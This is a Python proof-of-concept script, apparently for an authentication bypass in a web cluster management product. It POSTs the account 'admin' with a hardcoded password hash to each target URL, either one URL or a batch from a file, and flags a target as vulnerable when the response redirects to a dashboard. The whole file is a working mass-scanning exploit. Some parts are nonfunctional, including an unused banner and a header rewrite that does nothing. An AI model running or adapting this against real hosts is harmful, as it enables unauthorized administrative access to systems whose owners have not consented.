import requests
import argparse
import re

def banner():
    test ={"""
    ██╗      ██████╗  ██████╗ ██╗███╗   ██╗        ██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗
    ██║     ██╔═══██╗██╔════╝ ██║████╗  ██║        ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
    ██║     ██║   ██║██║  ███╗██║██╔██╗ ██║        ██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗
    ██║     ██║   ██║██║   ██║██║██║╚██╗██║        ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
    ███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║███████╗██████╔╝   ██║   ██║     ██║  ██║███████║███████║
    ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                                                tags: this is a Login to bypass the loopholes poc
                                                @verison:v1.0.0
                                                @author:Edison
"""
    }

def modify_request(url):
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/json;charset=UTF-8'
    }
    payload = {
        'account': 'admin',
        'password': '7110eda4d09e062aa5e4a390b0a572ac0d2c0220'
    }
    response = requests.post(url, headers=headers, json=payload)
    modified_response = response.text.replace(
        'HTTP/1.1 200\r\n',
        'HTTP/1.1 200\r\nServer: Hsengine/1.4.1\r\nDate: Mon, 17 May 2021 16:13:43 GMT\r\nContent-Type: application/json;charset=UTF-8\r\nConnection: close\r\nX-Frame-Options: SAMEORIGIN\r\nX-Content-Type-Options: nosniff\r\nX-XSS-Protection: 1; mode=block\r\nAccept-Ranges: bytes\r\nVary: Accept-Charset, Accept-Encoding, Accept-Language, Accept\r\nContent-Length: 61\r\n'
    )
    # print("Modified Response:")
    # print(modified_response)

    if '/cluster/dashboard' in response.url:
        print(f"{response.url} is vulnerable.")
    else:
        print(f"{response.url} is not vulnerable.")

    # Remove HTML tags from the response content
    clean_response = re.sub('<[^<]+?>', '', modified_response)
    # print("Clean Response:")
    # print(clean_response)

parser = argparse.ArgumentParser(description='修改请求和返回包的示例程序')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-u', '--url', help='处理单个 URL')
group.add_argument('-f', '--file', help='通过读取文件中的 URL 批量处理')

args = parser.parse_args()

if args.url:
    modify_request(args.url)
elif args.file:
    with open(args.file, 'r') as file:
        urls = file.readlines()
        for url in urls:
            modify_request(url.strip())
